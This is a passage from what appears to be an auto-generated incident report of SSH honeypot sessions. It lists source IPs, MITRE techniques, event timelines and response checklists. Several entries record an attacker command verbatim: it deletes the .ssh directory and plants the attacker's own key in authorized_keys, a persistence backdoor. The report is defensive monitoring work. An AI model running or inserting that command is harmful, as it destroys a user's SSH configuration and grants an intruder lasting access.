- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69cba3d0a030

| Field | Detail |
|---|---|
| **Source IP** | `14.46.87[.]209` |
| **First Seen** | 2026-09-01 16:30 |
| **Last Seen** | 2026-09-01 16:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 16:30:19` | `cowrie.session.connect` |
| `2026-09-01 16:30:19` | `cowrie.client.version` |
| `2026-09-01 16:30:19` | `cowrie.client.kex` |
| `2026-09-01 16:30:20` | `cowrie.login.success` |
| `2026-09-01 16:30:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.46.87[.]209` to AbuseIPDB if not already reported
- [ ] Block `14.46.87[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b11f6a497c4

| Field | Detail |
|---|---|
| **Source IP** | `14.46.87[.]209` |
| **First Seen** | 2026-09-01 16:30 |
| **Last Seen** | 2026-09-01 16:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 16:30:20` | `cowrie.session.connect` |
| `2026-09-01 16:30:20` | `cowrie.client.version` |
| `2026-09-01 16:30:20` | `cowrie.client.kex` |
| `2026-09-01 16:30:21` | `cowrie.login.success` |
| `2026-09-01 16:30:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.46.87[.]209` to AbuseIPDB if not already reported
- [ ] Block `14.46.87[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbf3874b0126

| Field | Detail |
|---|---|
| **Source IP** | `202.152.148[.]30` |
| **First Seen** | 2026-09-01 16:32 |
| **Last Seen** | 2026-09-01 16:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 16:32:52` | `cowrie.session.connect` |
| `2026-09-01 16:32:52` | `cowrie.client.version` |
| `2026-09-01 16:32:52` | `cowrie.client.kex` |
| `2026-09-01 16:32:53` | `cowrie.login.success` |
| `2026-09-01 16:32:54` | `cowrie.session.params` |
| `2026-09-01 16:32:54` | `cowrie.command.input` |
| `2026-09-01 16:32:54` | `cowrie.command.failed` |
| `2026-09-01 16:32:55` | `cowrie.log.closed` |
| `2026-09-01 16:32:56` | `cowrie.session.params` |
| `2026-09-01 16:32:56` | `cowrie.command.input` |
| `2026-09-01 16:32:56` | `cowrie.session.file_download` |
| `2026-09-01 16:32:56` | `cowrie.log.closed` |
| `2026-09-01 16:33:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.152.148[.]30` to AbuseIPDB if not already reported
- [ ] Block `202.152.148[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f59872dbf8c3

| Field | Detail |
|---|---|
| **Source IP** | `202.152.148[.]30` |
| **First Seen** | 2026-09-01 16:32 |
| **Last Seen** | 2026-09-01 16:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 16:32:56` | `cowrie.session.connect` |
| `2026-09-01 16:32:56` | `cowrie.client.version` |
| `2026-09-01 16:32:56` | `cowrie.client.kex` |
| `2026-09-01 16:32:58` | `cowrie.login.success` |
| `2026-09-01 16:32:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.152.148[.]30` to AbuseIPDB if not already reported
- [ ] Block `202.152.148[.]30` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29b5a678bbbb

| Field | Detail |
|---|---|
| **Source IP** | `202.152.148[.]30` |
| **First Seen** | 2026-09-01 16:32 |
| **Last Seen** | 2026-09-01 16:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 16:32:58` | `cowrie.session.connect` |
| `2026-09-01 16:32:58` | `cowrie.client.version` |
| `2026-09-01 16:32:58` | `cowrie.client.kex` |
| `2026-09-01 16:32:59` | `cowrie.login.success` |
| `2026-09-01 16:33:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.152.148[.]30` to AbuseIPDB if not already reported
- [ ] Block `202.152.148[.]30` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4aabf693a230

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 16:33 |
| **Last Seen** | 2026-09-01 16:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 16:33:28` | `cowrie.session.connect` |
| `2026-09-01 16:33:28` | `cowrie.client.version` |
| `2026-09-01 16:33:28` | `cowrie.client.kex` |
| `2026-09-01 16:33:29` | `cowrie.login.success` |
| `2026-09-01 16:33:29` | `cowrie.direct-tcpip.request` |
| `2026-09-01 16:33:29` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 16:33:29` | `cowrie.direct-tcpip.data` |
| `2026-09-01 16:33:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b402ce4f4a41

| Field | Detail |
|---|---|
| **Source IP** | `200.63.168[.]90` |
| **First Seen** | 2026-09-01 16:33 |
| **Last Seen** | 2026-09-01 16:33 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 16:33:51` | `cowrie.session.connect` |
| `2026-09-01 16:33:51` | `cowrie.client.version` |
| `2026-09-01 16:33:51` | `cowrie.client.kex` |
| `2026-09-01 16:33:52` | `cowrie.login.success` |
| `2026-09-01 16:33:53` | `cowrie.session.params` |
| `2026-09-01 16:33:53` | `cowrie.command.input` |
| `2026-09-01 16:33:53` | `cowrie.command.failed` |
| `2026-09-01 16:33:53` | `cowrie.log.closed` |
| `2026-09-01 16:33:54` | `cowrie.session.params` |
| `2026-09-01 16:33:54` | `cowrie.command.input` |
| `2026-09-01 16:33:54` | `cowrie.session.file_download` |
| `2026-09-01 16:33:54` | `cowrie.log.closed` |
| `2026-09-01 16:33:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.63.168[.]90` to AbuseIPDB if not already reported
- [ ] Block `200.63.168[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdb32aedefd1

| Field | Detail |
|---|---|
| **Source IP** | `200.63.168[.]90` |
| **First Seen** | 2026-09-01 16:33 |
| **Last Seen** | 2026-09-01 16:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 16:33:54` | `cowrie.session.connect` |
| `2026-09-01 16:33:54` | `cowrie.client.version` |
| `2026-09-01 16:33:54` | `cowrie.client.kex` |
| `2026-09-01 16:33:55` | `cowrie.login.success` |
| `2026-09-01 16:33:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.63.168[.]90` to AbuseIPDB if not already reported
- [ ] Block `200.63.168[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a00ae4851b2a

| Field | Detail |
|---|---|
| **Source IP** | `200.63.168[.]90` |
| **First Seen** | 2026-09-01 16:33 |
| **Last Seen** | 2026-09-01 16:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 16:33:55` | `cowrie.session.connect` |
| `2026-09-01 16:33:55` | `cowrie.client.version` |
| `2026-09-01 16:33:55` | `cowrie.client.kex` |
| `2026-09-01 16:33:56` | `cowrie.login.success` |
| `2026-09-01 16:33:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.63.168[.]90` to AbuseIPDB if not already reported
- [ ] Block `200.63.168[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-801d8be2cfa0

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-09-01 16:35 |
| **Last Seen** | 2026-09-01 16:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 16:35:01` | `cowrie.session.connect` |
| `2026-09-01 16:35:01` | `cowrie.client.version` |
| `2026-09-01 16:35:01` | `cowrie.client.kex` |
| `2026-09-01 16:35:02` | `cowrie.login.success` |
| `2026-09-01 16:35:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4477a463e245

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-09-01 16:35 |
| **Last Seen** | 2026-09-01 16:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 16:35:01` | `cowrie.session.connect` |
| `2026-09-01 16:35:01` | `cowrie.client.version` |
| `2026-09-01 16:35:01` | `cowrie.client.kex` |
| `2026-09-01 16:35:02` | `cowrie.login.success` |
| `2026-09-01 16:35:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e06ffab0e346

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 16:36 |
| **Last Seen** | 2026-09-01 16:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 16:36:28` | `cowrie.session.connect` |
| `2026-09-01 16:36:28` | `cowrie.client.version` |
| `2026-09-01 16:36:28` | `cowrie.client.kex` |
| `2026-09-01 16:36:29` | `cowrie.login.success` |
| `2026-09-01 16:36:29` | `cowrie.direct-tcpip.request` |
| `2026-09-01 16:36:29` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 16:36:29` | `cowrie.direct-tcpip.data` |
| `2026-09-01 16:36:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eeef3f73ee04

| Field | Detail |
|---|---|
| **Source IP** | `115.190.126[.]161` |
| **First Seen** | 2026-09-01 16:39 |
| **Last Seen** | 2026-09-01 16:44 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 16:39:47` | `cowrie.session.connect` |
| `2026-09-01 16:39:47` | `cowrie.client.version` |
| `2026-09-01 16:39:47` | `cowrie.client.kex` |
| `2026-09-01 16:39:49` | `cowrie.login.success` |
| `2026-09-01 16:44:49` | `cowrie.session.file_upload` |
| `2026-09-01 16:44:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.126[.]161` to AbuseIPDB if not already reported
- [ ] Block `115.190.126[.]161` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fe3aa24f3c6

| Field | Detail |
|---|---|
| **Source IP** | `2.26.172[.]97` |
| **First Seen** | 2026-09-01 16:39 |
| **Last Seen** | 2026-09-01 16:40 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 16:39:56` | `cowrie.session.connect` |
| `2026-09-01 16:39:59` | `cowrie.login.success` |
| `2026-09-01 16:40:00` | `cowrie.session.params` |
| `2026-09-01 16:40:00` | `cowrie.command.input` |
| `2026-09-01 16:40:00` | `cowrie.command.input` |
| `2026-09-01 16:40:00` | `cowrie.command.failed` |
| `2026-09-01 16:40:00` | `cowrie.command.input` |
| `2026-09-01 16:40:04` | `cowrie.log.closed` |
| `2026-09-01 16:40:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.26.172[.]97` to AbuseIPDB if not already reported
- [ ] Block `2.26.172[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3dc9c46bc24b

| Field | Detail |
|---|---|
| **Source IP** | `2.26.172[.]97` |
| **First Seen** | 2026-09-01 16:40 |
| **Last Seen** | 2026-09-01 16:40 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36, Accept-Encoding: gzip, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 16:40:05` | `cowrie.session.connect` |
| `2026-09-01 16:40:10` | `cowrie.login.success` |
| `2026-09-01 16:40:10` | `cowrie.session.params` |
| `2026-09-01 16:40:10` | `cowrie.command.input` |
| `2026-09-01 16:40:10` | `cowrie.command.input` |
| `2026-09-01 16:40:10` | `cowrie.command.failed` |
| `2026-09-01 16:40:10` | `cowrie.command.input` |
| `2026-09-01 16:40:10` | `cowrie.command.failed` |
| `2026-09-01 16:40:10` | `cowrie.command.input` |
| `2026-09-01 16:40:15` | `cowrie.log.closed` |
| `2026-09-01 16:40:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.26.172[.]97` to AbuseIPDB if not already reported
- [ ] Block `2.26.172[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66b4747e531b

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-09-01 16:42 |
| **Last Seen** | 2026-09-01 16:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 16:42:16` | `cowrie.session.connect` |
| `2026-09-01 16:42:16` | `cowrie.client.version` |
| `2026-09-01 16:42:16` | `cowrie.client.kex` |
| `2026-09-01 16:42:17` | `cowrie.login.success` |
| `2026-09-01 16:42:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01ae33b2f2c6

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-09-01 16:42 |
| **Last Seen** | 2026-09-01 16:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 16:42:16` | `cowrie.session.connect` |
| `2026-09-01 16:42:16` | `cowrie.client.version` |
| `2026-09-01 16:42:17` | `cowrie.client.kex` |
| `2026-09-01 16:42:17` | `cowrie.login.success` |
| `2026-09-01 16:42:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e53f6e3557ab

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-09-01 16:42 |
| **Last Seen** | 2026-09-01 16:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 16:42:25` | `cowrie.session.connect` |
| `2026-09-01 16:42:25` | `cowrie.client.version` |
| `2026-09-01 16:42:25` | `cowrie.client.kex` |
| `2026-09-01 16:42:26` | `cowrie.login.success` |
| `2026-09-01 16:42:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62185e12557f

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-09-01 16:42 |
| **Last Seen** | 2026-09-01 16:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 16:42:26` | `cowrie.session.connect` |
| `2026-09-01 16:42:26` | `cowrie.client.version` |
| `2026-09-01 16:42:26` | `cowrie.client.kex` |
| `2026-09-01 16:42:26` | `cowrie.login.success` |
| `2026-09-01 16:42:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0298bc860583

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 16:42 |
| **Last Seen** | 2026-09-01 16:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 16:42:46` | `cowrie.session.connect` |
| `2026-09-01 16:42:46` | `cowrie.client.version` |
| `2026-09-01 16:42:46` | `cowrie.client.kex` |
| `2026-09-01 16:42:47` | `cowrie.login.success` |
| `2026-09-01 16:42:48` | `cowrie.direct-tcpip.request` |
| `2026-09-01 16:42:48` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 16:42:48` | `cowrie.direct-tcpip.data` |
| `2026-09-01 16:42:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e18c8f7dbce

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-01 16:44 |
| **Last Seen** | 2026-09-01 16:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 16:44:42` | `cowrie.session.connect` |
| `2026-09-01 16:44:42` | `cowrie.client.version` |
| `2026-09-01 16:44:42` | `cowrie.client.kex` |
| `2026-09-01 16:44:42` | `cowrie.login.success` |
| `2026-09-01 16:44:42` | `cowrie.direct-tcpip.request` |
| `2026-09-01 16:44:42` | `cowrie.direct-tcpip.data` |
| `2026-09-01 16:44:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-979e1f7bf6b2

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 16:47 |
| **Last Seen** | 2026-09-01 16:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 16:47:22` | `cowrie.session.connect` |
| `2026-09-01 16:47:22` | `cowrie.client.version` |
| `2026-09-01 16:47:22` | `cowrie.client.kex` |
| `2026-09-01 16:47:23` | `cowrie.login.success` |
| `2026-09-01 16:47:24` | `cowrie.direct-tcpip.request` |
| `2026-09-01 16:47:24` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 16:47:24` | `cowrie.direct-tcpip.data` |
| `2026-09-01 16:47:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2625fb724e1a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 16:52 |
| **Last Seen** | 2026-09-01 16:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 16:52:22` | `cowrie.session.connect` |
| `2026-09-01 16:52:22` | `cowrie.client.version` |
| `2026-09-01 16:52:22` | `cowrie.client.kex` |
| `2026-09-01 16:52:23` | `cowrie.login.success` |
| `2026-09-01 16:52:23` | `cowrie.direct-tcpip.request` |
| `2026-09-01 16:52:23` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 16:52:23` | `cowrie.direct-tcpip.data` |
| `2026-09-01 16:52:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6447370c7689

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 16:58 |
| **Last Seen** | 2026-09-01 16:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 16:58:05` | `cowrie.session.connect` |
| `2026-09-01 16:58:05` | `cowrie.client.version` |
| `2026-09-01 16:58:05` | `cowrie.client.kex` |
| `2026-09-01 16:58:06` | `cowrie.login.success` |
| `2026-09-01 16:58:07` | `cowrie.direct-tcpip.request` |
| `2026-09-01 16:58:07` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 16:58:07` | `cowrie.direct-tcpip.data` |
| `2026-09-01 16:58:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b914c57b4dbe

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 17:01 |
| **Last Seen** | 2026-09-01 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:01:50` | `cowrie.session.connect` |
| `2026-09-01 17:01:50` | `cowrie.client.version` |
| `2026-09-01 17:01:50` | `cowrie.client.kex` |
| `2026-09-01 17:01:51` | `cowrie.login.success` |
